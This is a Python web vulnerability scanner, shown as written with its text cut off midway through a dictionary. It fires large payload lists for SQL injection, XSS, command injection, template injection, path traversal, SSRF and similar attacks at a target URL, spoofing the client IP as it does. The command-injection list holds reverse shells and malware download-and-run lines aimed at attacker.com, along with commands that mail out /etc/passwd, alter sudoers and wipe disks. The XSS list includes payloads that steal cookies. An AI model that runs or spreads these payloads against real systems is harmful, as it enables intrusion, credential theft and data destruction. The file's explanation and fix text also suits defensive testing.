import requests
import os
from bs4 import BeautifulSoup
from urllib.parse import urlparse, urljoin
import concurrent.futures
import time
import re
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
import dns.resolver
import socket
import random
import json
import aiohttp
import asyncio
import platform

logo = '''
 _______ _________ _______  _______ 
(  ___  )\\__   __/(  __   )(       )
| (   ) |   ) (   | (  )  || () () |
| (___) |   | |   | | /   || || || |
|  ___  |   | |   | (/ /) || |(_)| |
| (   ) |   | |   |   / | || |   | |
| )   ( |   | |   |  (__) || )   ( |
|/     \\|   )_(   (_______)|/     \\|
                                
'''

# Extended payloads and techniques
PAYLOADS = {
    "SQL Injection": [
        "' OR '1'='1'", "1 OR 1=1", "' UNION SELECT NULL, NULL, NULL--",
        "admin' --", "1'; DROP TABLE users--", "1' AND 1=1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#",
        "' OR '1'='1' --", "' OR 1=1#", "' OR 1=1/*", ') OR \'1\'=\'1', "1' ORDER BY 1--+",
        "UNION SELECT @@version", "' HAVING 1=1--", "' GROUP BY columnnames HAVING 1=1--",
        "' UNION ALL SELECT 1,2,3,4,5,6,load_file('/etc/passwd')--",
        "AND 1=convert(int,(SELECT @@version))",
        "AND 1=convert(int,(SELECT user))",
        "AND 1=convert(int,(SELECT password FROM users WHERE username='admin'))",
        "WAITFOR DELAY '0:0:10'--", "BENCHMARK(1000000,MD5(1))",
        "'; EXEC xp_cmdshell('net user');--", "'; EXEC sp_addlogin 'name', 'password';--",
        "UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x3c62723e,version(),0x3c62723e)",
        "' UNION SELECT SUM(columnname) FROM tablename--",
        "' UNION SELECT COUNT(*),CONCAT(0x3a,0x3a,(SELECT version()),0x3a,0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x--"
    ],
    "XSS": [
        "<script>alert('XSS')</script>", "<img src=x onerror=alert('XSS')>",
        "javascript:alert('XSS')", "<svg onload=alert('XSS')>", "'-alert('XSS')-'",
        "<body onload=alert('XSS')>", "<iframe src=\"javascript:alert('XSS');\">", 
        "<img src=\"javascript:alert('XSS');\">", "<input type=\"image\" src=\"javascript:alert('XSS');\">",
        "<scr<script>ipt>alert('XSS')</scr</script>ipt>",
        "<<SCRIPT>alert(\"XSS\");//<</SCRIPT>",
        "<IMG \"\"\"><SCRIPT>alert(\"XSS\")</SCRIPT>\">",
        "<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>",
        "<IMG SRC=# onmouseover=\"alert('xxs')\">",
        "<IMG SRC= onmouseover=\"alert('xxs')\">",
        "<IMG onmouseover=\"alert('xxs')\">",
        "<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>",
        "<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>",
        "<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>",
        "<BODY BACKGROUND=\"javascript:alert('XSS')\">",
        "<BODY ONLOAD=alert('XSS')>",
        "<INPUT TYPE=\"IMAGE\" SRC=\"javascript:alert('XSS');\">",
        "<IFRAME SRC=\"javascript:alert('XSS');\"></IFRAME>",
        "<SCRIPT>var img=new Image();img.src=\"http://hacker.site/\"+document.cookie;</SCRIPT>",
        "<SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",
        "<SCRIPT SRC=http://xss.rocks/xss.js></SCRIPT>",
        "<SCRIPT>document.write(\"<SCRI\");</SCRIPT>PT SRC=\"http://xss.rocks/xss.js\"></SCRIPT>",
        "<<SCRIPT>alert(\"XSS\");//<</SCRIPT>",
        "<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=javascript:alert('XSS');\">",
        "<META HTTP-EQUIV=\"refresh\" CONTENT=\"0; URL=http://;URL=javascript:alert('XSS');\">",
        "<IFRAME SRC=\"javascript:alert('XSS');\"></IFRAME>",
        "<FRAMESET><FRAME SRC=\"javascript:alert('XSS');\"></FRAMESET>",
        "<TABLE BACKGROUND=\"javascript:alert('XSS')\">",
        "<DIV STYLE=\"background-image: url(javascript:alert('XSS'))\">",
        "<DIV STYLE=\"width: expression(alert('XSS'));\">",
        "<STYLE>@import'http://xss.rocks/xss.css';</STYLE>",
        "<XSS STYLE=\"behavior: url(xss.htc);\">",
        "<STYLE>.XSS{background-image:url(\"javascript:alert('XSS')\");}</STYLE><A CLASS=XSS></A>",
        "<STYLE type=\"text/css\">BODY{background:url(\"javascript:alert('XSS')\")}</STYLE>",
        "<!--[if gte IE 4]><SCRIPT>alert('XSS');</SCRIPT><![endif]-->",
        "<BASE HREF=\"javascript:alert('XSS');//\">",
        "<OBJECT TYPE=\"text/x-scriptlet\" DATA=\"http://xss.rocks/scriptlet.html\"></OBJECT>",
        "<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:alert('XSS')></OBJECT>",
        "<EMBED SRC=\"http://ha.ckers.org/xss.swf\" AllowScriptAccess=\"always\"></EMBED>",
        "<EMBED SRC=\"data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==\" type=\"image/svg+xml\" AllowScriptAccess=\"always\"></EMBED>",
        "<SCRIPT SRC=\"http://xss.rocks/xss.jpg\"></SCRIPT>",
        "<HTML><BODY><?xml:namespace prefix=\"t\" ns=\"urn:schemas-microsoft-com:time\"><?import namespace=\"t\" implementation=\"#default#time2\"><t:set attributeName=\"innerHTML\" to=\"XSS&lt;SCRIPT DEFER&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;\"></t:set></BODY></HTML>",
        "<SCRIPT>document.write(\"<SCRI\");</SCRIPT>PT SRC=\"http://xss.rocks/xss.js\"></SCRIPT>",
        "<form id=\"test\" /><button form=\"test\" formaction=\"javascript:alert(123)\">TESTHTML5FORMACTION",
        "<form><button formaction=\"javascript:alert(123)\">crosssitespt",
        "<frameset onload=alert(123)>",
        "<!--<img src=\"--><img src=x onerror=alert(123)//\">",
        "<style><img src=\"</style><img src=x onerror=alert(123)//\">",
        "<object data=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\">",
        "<embed src=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\">",
        "<embed src=\"javascript:alert(1)\">",
        "<? foo=\"><script>alert(1)</script>\">",
        "<! foo=\"><script>alert(1)</script>\">",
        "</ foo=\"><script>alert(1)</script>\">",
        "<? foo=\"><x foo='?><script>alert(1)</script>'>\">"
    ],
    "CSRF": [
        "<img src='http://attacker.com/csrf.php?action=transfer&amount=1000&to=attacker'>",
        "<iframe src='http://vulnerable-site.com/transfer?amount=1000&to=attacker' style='display:none'>",
        "<form action='http://bank.com/transfer' method='POST'><input type='hidden' name='amount' value='1000'><input type='hidden' name='to' value='attacker'></form><script>document.forms[0].submit();</script>",
        "<img src=\"http://www.example.com/index.php?action=delete&id=123\">",
        "<iframe src=\"http://www.example.com/index.php?action=delete&id=123\"></iframe>",
        "<form action=\"http://www.example.com/index.php\" method=\"POST\"><input type=\"hidden\" name=\"action\" value=\"delete\"><input type=\"hidden\" name=\"id\" value=\"123\"><input type=\"submit\" value=\"Submit Request\"></form>",
        "<script>var xhr = new XMLHttpRequest();xhr.open('POST', 'http://www.example.com/index.php', true);xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');xhr.send('action=delete&id=123');</script>",
        "<script>fetch('http://www.example.com/index.php', {method: 'POST', body: 'action=delete&id=123', headers: {'Content-Type': 'application/x-www-form-urlencoded'}});</script>",
        "<form id=\"csrf-form\" action=\"http://www.example.com/index.php\" method=\"POST\"><input type=\"hidden\" name=\"action\" value=\"delete\"><input type=\"hidden\" name=\"id\" value=\"123\"></form><script>document.getElementById('csrf-form').submit();</script>",
        "<img src=\"http://www.example.com/index.php?action=delete&id=123\" style=\"display:none\" onload=\"if(!window.x){window.x=1;alert('CSRF Attempt')}\">",
        "<meta http-equiv=\"refresh\" content=\"0;url=http://www.example.com/index.php?action=delete&id=123\">",
        "<script>$.ajax({url: 'http://www.example.com/index.php', type: 'POST', data: {action: 'delete', id: '123'}});</script>",
        "<form action=\"http://www.example.com/index.php\" method=\"POST\" id=\"csrf-form\"><input type=\"hidden\" name=\"action\" value=\"delete\"><input type=\"hidden\" name=\"id\" value=\"123\"></form><img src=\"x\" onerror=\"document.getElementById('csrf-form').submit();\">",
        "<script>var img = new Image(); img.src = \"http://www.example.com/index.php?action=delete&id=123\";</script>",
        "<body onload=\"document.forms[0].submit()\"><form action=\"http://www.example.com/index.php\" method=\"POST\"><input type=\"hidden\" name=\"action\" value=\"delete\"><input type=\"hidden\" name=\"id\" value=\"123\"></form></body>"
    ],
    "Command Injection": [
        "; ls -la", "& echo vulnerable", "| cat /etc/passwd", "`id`", "$(whoami)",
        "; ping -c 4 attacker.com", "| netstat -an", "; curl http://attacker.com/malware.sh | sh",
        "& dir", "; uname -a",
        "| id", "; id", "& id", "`id`", "$(id)",
        "; ls -l /etc/passwd", "& type C:\\Windows\\win.ini",
        "| whoami", "; whoami", "& whoami", "`whoami`", "$(whoami)",
        "; nc -e /bin/sh attacker.com 4444",
        "& powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"attacker.com\",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()",
        "; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"attacker.com\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
        "& echo %USERNAME%", "; echo $USER",
        "| findstr /V /L /I /C:\"\" C:\\Windows\\win.ini",
        "; cat /etc/shadow", "& type C:\\Windows\\repair\\SAM",
        "| grep root /etc/passwd", "; net user",
        "`ping -c 4 attacker.com`", "$(ping -c 4 attacker.com)",
        "; bash -i >& /dev/tcp/attacker.com/4444 0>&1",
        "& net user hacker password123 /add",
        "; echo 'ALL ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers",
        "| mail attacker@evil.com < /etc/passwd",
        "; wget http://attacker.com/backdoor -O /tmp/backdoor && chmod +x /tmp/backdoor && /tmp/backdoor",
        "& certutil.exe -urlcache -split -f http://attacker.com/malware.exe C:\\malware.exe && C:\\malware.exe",
        "; rm -rf /",
        "& format C: /y",
        "| dd if=/dev/zero of=/dev/sda",
        "; :(){ :|:& };:",
        "& for /L %i in (1,1,100) do start",
        "; while true; do echo 'Fork Bomb'; done",
        "| cat /proc/version", "; systeminfo",
        "; crontab -e", "& schtasks /create /tn \"MyTask\" /tr C:\\malware.exe /sc ONLOGON",
        "; curl -s https://attacker.com/script.sh | bash",
        "& powershell -Command \"(New-Object System.Net.WebClient).DownloadFile('http://attacker.com/malware.exe', 'C:\\malware.exe')\""
    ],
    "Path Traversal": [
        "../../../etc/passwd", "..\\..\\..\\windows\\win.ini", "....//....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", "..%252f..%252f..%252fetc%252fpasswd",
        "/var/www/../../etc/passwd", "..%c0%af..%c0%af..%c0%afetc/passwd", "%00../../etc/passwd%00.jpg",
        "..././..././..././etc/passwd", "....\\....\\....\\windows\\win.ini",
        "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd",
        "..%c1%9c..%c1%9c..%c1%9cetc/passwd",
        "..%255c..%255c..%255cwindows%255cwin.ini",
        "/etc/passwd", "C:\\Windows\\System32\\drivers\\etc\\hosts",
        "/proc/self/environ", "php://filter/convert.base64-encode/resource=index.php",
        "file:///etc/passwd", "file://C:/Windows/System32/drivers/etc/hosts",
        "/dev/null", "C:\\Windows\\win.ini",
        "/var/log/apache2/access.log", "C:\\inetpub\\logs\\LogFiles\\W3SVC1\\u_ex*.log",
        "/proc/self/cmdline", "C:\\Windows\\debug\\NetSetup.log",
        "/etc/shadow", "C:\\Windows\\repair\\SAM",
        "/root/.ssh/id_rsa", "C:\\Users\\Administrator\\.ssh\\id_rsa",
        "/var/www/html/index.php", "C:\\inetpub\\wwwroot\\index.asp",
        "/etc/apache2/apache2.conf", "C:\\Windows\\System32\\inetsrv\\config\\applicationHost.config",
        "/proc/version", "C:\\Windows\\System32\\license.rtf",
        "/etc/issue", "C:\\Windows\\System32\\eula.txt",
        "/etc/profile", "C:\\Windows\\System32\\config\\SAM",
        "/proc/cmdline", "C:\\boot.ini",
        "/etc/resolv.conf", "C:\\Windows\\System32\\drivers\\etc\\networks",
        "/etc/motd", "C:\\Windows\\System32\\config\\SYSTEM",
        "/proc/sched_debug", "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\",
        "/etc/crontab", "C:\\Windows\\Panther\\Unattend.xml",
        "/var/log/syslog", "C:\\Windows\\Panther\\Unattend\\Unattend.xml",
        "/etc/fstab", "C:\\Windows\\debug\\WIA\\wiatrace.log",
        "/proc/mounts", "C:\\sysprep.inf",
        "/etc/group", "C:\\sysprep\\sysprep.xml",
        "/etc/hosts", "C:\\Windows\\System32\\config\\RegBack\\SAM",
        "php://filter/read=convert.base64-encode/resource=index.php",
        "php://input",
        "php://filter/zlib.deflate/convert.base64-encode/resource=index.php",
        "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=",
        "expect://id",
        "php://filter/convert.iconv.utf-8.utf-16/resource=index.php",
        "php://filter/convert.base64-decode/resource=index.php",
        "phar://test.phar/test.txt",
        "zip://test.zip#test.txt",
        "compress.zlib://file.txt",
        "glob:///var/www/html/*.php",
        "php://temp",
        "php://memory",
        "php://filter/string.rot13/resource=index.php",
        "php://filter/string.toupper/resource=index.php",
        "php://filter/string.tolower/resource=index.php",
        "php://filter/string.strip_tags/resource=index.php"
    ],
    "Remote Code Execution": [
        "{{7*7}}", "${7*7}", "#{7*7}",
        "<%= 7 * 7 %>", "{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}",
        "${@print(system('cat /etc/passwd'))}",
        "{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}",
        "{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}",
        "#{session.eval('`ls /`')}",
        "${T(java.lang.Runtime).getRuntime().exec('ls')}",
        "<#assign ex = \"freemarker.template.utility.Execute\"?new()>${ex(\"ls\")}",
        "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
        "${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}",
        "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
        "{{''.__class__.mro()[1].__subclasses__()[396]('cat /etc/passwd',shell=True,stdout=-1).communicate()[0].strip()}}",
        "{{config.__class__.__init__.__globals__['os'].popen('cat /etc/passwd').read()}}",
        "${T(java.lang.System).getenv()}",
        "{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read()}}",
        "${T(java.lang.Runtime).getRuntime().exec('whoami')}",
        "{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}",
        "${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('whoami').getInputStream())}",
        "{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}",
        "${T(java.lang.Runtime).getRuntime().exec('touch /tmp/pwned')}",
        "{{config.__class__.__init__.__globals__['os'].popen('touch /tmp/pwned').read()}}",
        "{{''.__class__.mro()[1].__subclasses__()[396]('touch /tmp/pwned',shell=True,stdout=-1).communicate()}}",
        "${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('touch /tmp/pwned').getInputStream())}",
        "{{request.application.__globals__.__builtins__.__import__('os').popen('touch /tmp/pwned').read()}}",
        "${T(java.lang.System).getProperty('user.name')}",
        "{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('touch /tmp/pwned').read()}}",
        "${T(java.lang.Runtime).getRuntime().exec('echo pwned > /tmp/pwned')}",
        "{{config.__class__.__init__.__globals__['os'].popen('echo pwned > /tmp/pwned').read()}}",
        "{{''.__class__.mro()[1].__subclasses__()[396]('echo pwned > /tmp/pwned',shell=True,stdout=-1).communicate()}}",
        "${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('echo pwned > /tmp/pwned').getInputStream())}",
        "{{request.application.__globals__.__builtins__.__import__('os').popen('echo pwned > /tmp/pwned').read()}}"
    ],
    "Local File Inclusion": [
        "/etc/passwd", "C:\\Windows\\System32\\drivers\\etc\\hosts",
        "/proc/self/environ", "php://filter/convert.base64-encode/resource=index.php",
        "file:///etc/passwd", "file://C:/Windows/System32/drivers/etc/hosts",
        "/var/log/apache2/access.log", "C:\\inetpub\\logs\\LogFiles\\W3SVC1\\u_ex*.log",
        "/proc/self/cmdline", "C:\\Windows\\debug\\NetSetup.log",
        "/etc/shadow", "C:\\Windows\\repair\\SAM",
        "/root/.ssh/id_rsa", "C:\\Users\\Administrator\\.ssh\\id_rsa",
        "/var/www/html/index.php", "C:\\inetpub\\wwwroot\\index.asp",
        "/etc/apache2/apache2.conf", "C:\\Windows\\System32\\inetsrv\\config\\applicationHost.config",
        "/proc/version", "C:\\Windows\\System32\\license.rtf",
        "/etc/issue", "C:\\Windows\\System32\\eula.txt",
        "/etc/profile", "C:\\Windows\\System32\\config\\SAM",
        "/proc/cmdline", "C:\\boot.ini",
        "/etc/resolv.conf", "C:\\Windows\\System32\\drivers\\etc\\networks",
        "/etc/motd", "C:\\Windows\\System32\\config\\SYSTEM",
        "/proc/sched_debug", "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\",
        "/etc/crontab", "C:\\Windows\\Panther\\Unattend.xml",
        "/var/log/syslog", "C:\\Windows\\Panther\\Unattend\\Unattend.xml",
        "/etc/fstab", "C:\\Windows\\debug\\WIA\\wiatrace.log",
        "/proc/mounts", "C:\\sysprep.inf",
        "/etc/group", "C:\\sysprep\\sysprep.xml",
        "/etc/hosts", "C:\\Windows\\System32\\config\\RegBack\\SAM",
        "php://filter/read=convert.base64-encode/resource=index.php",
        "php://input",
        "php://filter/zlib.deflate/convert.base64-encode/resource=index.php",
        "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=",
        "expect://id",
        "php://filter/convert.iconv.utf-8.utf-16/resource=index.php",
        "php://filter/convert.base64-decode/resource=index.php",
        "phar://test.phar/test.txt",
        "zip://test.zip#test.txt",
        "compress.zlib://file.txt",
        "glob:///var/www/html/*.php",
        "php://temp",
        "php://memory",
        "php://filter/string.rot13/resource=index.php",
        "php://filter/string.toupper/resource=index.php",
        "php://filter/string.tolower/resource=index.php",
        "php://filter/string.strip_tags/resource=index.php"
    ],
    "Server-Side Template Injection": [
        "${7*7}", "{{7*7}}", "<%= 7 * 7 %>", "#{7*7}",
        "${T(java.lang.Runtime).getRuntime().exec('ls')}",
        "{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}",
        "<#assign ex = \"freemarker.template.utility.Execute\"?new()>${ex(\"ls\")}",
        "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
        "${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}",
        "{{''.__class__.mro()[1].__subclasses__()[396]('cat /etc/passwd',shell=True,stdout=-1).communicate()[0].strip()}}",
        "${T(java.lang.System).getenv()}",
        "{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read()}}",
        "{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}",
        "${T(java.lang.Runtime).getRuntime().exec('touch /tmp/pwned')}",
        "{{config.__class__.__init__.__globals__['os'].popen('touch /tmp/pwned').read()}}",
        "{{''.__class__.mro()[1].__subclasses__()[396]('touch /tmp/pwned',shell=True,stdout=-1).communicate()}}",
        "${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('touch /tmp/pwned').getInputStream())}",
        "{{request.application.__globals__.__builtins__.__import__('os').popen('touch /tmp/pwned').read()}}",
        "${T(java.lang.System).getProperty('user.name')}",
        "${T(java.lang.Runtime).getRuntime().exec('ls')}"
    ],
    "XML External Entity": [
        "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]>",
        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]><foo>&xxe;</foo>"
    ],
    "Open Redirect": [
        "//evil.com", "https://evil.com", "//google.com%2F@evil.com",
        "https://example.com@evil.com", "javascript:alert('Open Redirect')"
    ],
    "Insecure Deserialization": [
        "O:8:\"stdClass\":1:{s:1:\"a\";O:8:\"stdClass\":1:{s:1:\"b\":\"evil_function\";}}",
        "rO0ABXNyABNqYXZhLnV0aWwuQXJyYXlMaXN0eIHSHZnHYZ0DAAFJAARzaXpleHAAAAABdwQAAAABdAAJZXZpbF9mdW5jdA=="
    ],
    "SSRF": [
        "http://localhost", "http://127.0.0.1", "http://[::1]", "http://169.254.169.254",
        "http://metadata.google.internal", "gopher://127.0.0.1:9000/_GET /HTTP/1.0"
    ],
    "CRLF Injection": [
        "%0D%0ASet-Cookie: sessionid=1234", "%0D%0AContent-Length: 0%0D%0A%0D%0AHTTP/1.1 200 OK%0D%0AContent-Type: text/html%0D%0AContent-Length: 20%0D%0A%0D%0A<html>Injected</html>"
    ],
    "HTTP Parameter Pollution": [
        "param=value1&param=value2", "param=value1%26param=value2"
    ],
    "LDAP Injection": [
        "*)(uid=*))(|(uid=*", "*)((|uid=*)", "*()|%26", "*(|(mail=*))"
    ],
    "NoSQL Injection": [
        "{'$gt': ''}", "{'$ne': null}", "{'$where': 'this.password.match(/.*/)'}",
        "{username: {'$regex': 'admin'}}"
    ],
    "HTTP Request Smuggling": [
        "Content-Length: 0\r\n\r\nGET /admin HTTP/1.1\r\nHost: vulnerable-website.com"
    ],
    "Server-Side Request Forgery": [
        "http://169.254.169.254/latest/meta-data/", "file:///etc/passwd",
        "dict://attacker:11111/", "gopher://127.0.0.1:25/HELO"
    ],
    "GraphQL Injection": [
        "{__schema{types{name,fields{name}}}}", "mutation{__placeholder__placeholderField}"
    ],
    "Host Header Injection": [
        "Host: evil.com", "X-Forwarded-Host: evil.com"
    ],
    "Web Cache Poisoning": [
        "X-Forwarded-Host: evil.com", "X-Host: evil.com"
    ]
}

def create_session():
    session = requests.Session()
    retries = Retry(total=5, backoff_factor=0.1, status_forcelist=[500, 502, 503, 504])
    adapter = HTTPAdapter(max_retries=retries)
    session.mount('http://', adapter)
    session.mount('https://', adapter)
    return session

SESSION = create_session()

def make_request(url, params=None, data=None, headers=None, method='GET', timeout=10):
    try:
        response = SESSION.request(method, url, params=params, data=data, headers=headers, timeout=timeout, allow_redirects=False, verify=False)
        return response
    except requests.exceptions.RequestException:
        return None

def check_vulnerability(url, technique, payloads):
    results = []
    for payload in payloads:
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'X-Forwarded-For': f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
        }
        response = make_request(url, data=payload, headers=headers, method='POST')
        if response:
            if response.status_code in [200, 302, 500]:
                confirmation_response = make_request(url, data=payload, headers=headers, method='POST')
                if confirmation_response and confirmation_response.status_code in [200, 302, 500]:
                    result = f"Potential {technique} vulnerability detected"
                    example = f"POST to {url} with payload: {payload}"
                    explanation = get_vulnerability_explanation(technique)
                    fix = get_vulnerability_fix(technique)
                    results.append((result, example, explanation, fix, payload))
    return results

def get_vulnerability_explanation(technique):
    explanations = {
        "SQL Injection": "SQL Injection occurs when user-supplied data is not properly sanitized and is included in SQL queries. This can lead to unauthorized data access or manipulation.",
        "XSS": "Cross-Site Scripting (XSS) occurs when malicious scripts are injected into trusted websites. This can lead to theft of sensitive information or session hijacking.",
        "CSRF": "Cross-Site Request Forgery (CSRF) tricks the victim into submitting a malicious request. It inherits the identity and privileges of the victim to perform an undesired function on their behalf.",
        "Command Injection": "Command Injection occurs when system commands can be injected through unsanitized user inputs. This can lead to unauthorized system access or manipulation.",
        "Path Traversal": "Path Traversal allows attackers to access files and directories outside of the web root folder. This can lead to sensitive data exposure.",
        "Remote Code Execution": "Remote Code Execution allows an attacker to execute arbitrary code on the target system, potentially leading to full system compromise.",
        "Local File Inclusion": "Local File Inclusion allows an attacker to include files on a server through the web browser, which can lead to sensitive information disclosure or remote code execution.",
        "Server-Side Template Injection": "Server-Side Template Injection occurs when user input is embedded in a template in an unsafe manner, allowing an attacker to inject template directives to execute arbitrary code.",
        "XML External Entity": "XML External Entity (XXE) attacks can lead to the disclosure of confidential data, denial of service, server-side request forgery, and other system impacts.",
        "Open Redirect": "Open Redirect vulnerabilities occur when a web application accepts user-controlled input that specifies a link to an external site, and uses that link in a redirect without validation.",
        "Insecure Deserialization": "Insecure Deserialization occurs when untrusted data is used to abuse the logic of an application, inflict a denial of service (DoS), or execute arbitrary code.",
        "SSRF": "Server-Side Request Forgery allows an attacker to induce the server-side application to make HTTP requests to an arbitrary domain of the attacker's choosing.",
        "CRLF Injection": "CRLF Injection occurs when an attacker is able to inject a CRLF sequence into an HTTP response header, potentially leading to response splitting or cache poisoning.",
        "HTTP Parameter Pollution": "HTTP Parameter Pollution occurs when an attacker manipulates how web applications parse and process query string parameters in HTTP requests.",
        "LDAP Injection": "LDAP Injection occurs when user input is incorrectly filtered, allowing attackers to manipulate LDAP statements to execute arbitrary commands.",
        "NoSQL Injection": "NoSQL Injection attacks occur when user input is directly included in NoSQL database queries without proper sanitization.",
        "HTTP Request Smuggling": "HTTP Request Smuggling exploits the different ways that a web server and its proxies or caching servers interpret HTTP request headers.",
        "GraphQL Injection": "GraphQL Injection occurs when user-supplied input is not properly sanitized, allowing an attacker to modify or extract unauthorized data from the GraphQL API.",
        "Host Header Injection": "Host Header Injection occurs when the web application implicitly trusts the Host header and uses it in security-critical operations.",
        "Web Cache Poisoning": "Web Cache Poisoning occurs when an attacker manipulates cached web content to spread malicious payloads to multiple users."
    }
    return explanations.get(technique, "No explanation available for this technique.")

def get_vulnerability_fix(technique):
    fixes = {
        "SQL Injection": "Use parameterized queries or prepared statements. Implement input validation and sanitization.",
        "XSS": "Implement proper output encoding. Use Content Security Policy (CSP) headers. Sanitize user inputs.",
        "CSRF": "Implement anti-CSRF tokens. Use SameSite cookie attribute. Verify the origin header.",
        "Command Injection": "Avoid using user input directly in system commands. Use allowlists for permitted commands. Implement strict input validation.",
        "Path Traversal": "Use robust input validation. Avoid passing user-supplied input directly to file system calls. Use chroot jails if possible.",
        "Remote Code Execution": "Implement strict input validation and sanitization. Use the principle of least privilege. Keep all software and dependencies up to date.",
        "Local File Inclusion": "Implement strict input validation. Use whitelists for allowed file inclusions. Avoid passing user input directly to file inclusion functions.",
        "Server-Side Template Injection": "Avoid using user-supplied input in template contexts. If necessary, use a templating engine that supports sandboxing or has built-in protections.",
        "XML External Entity": "Disable XML external entity processing in all XML parsers in the application. Use less complex data formats like JSON where possible.",
        "Open Redirect": "Implement a whitelist of allowed redirect destinations. Avoid using user input directly in redirect functions.",
        "Insecure Deserialization": "Avoid deserializing untrusted data. If necessary, use integrity checks or encryption to detect tampering.",
        "SSRF": "Implement whitelists for allowed domains and IP ranges. Use a server-side proxy for HTTP requests.",
        "CRLF Injection": "Sanitize user input by removing or encoding CRLF sequences. Use appropriate response headers to prevent response splitting.",
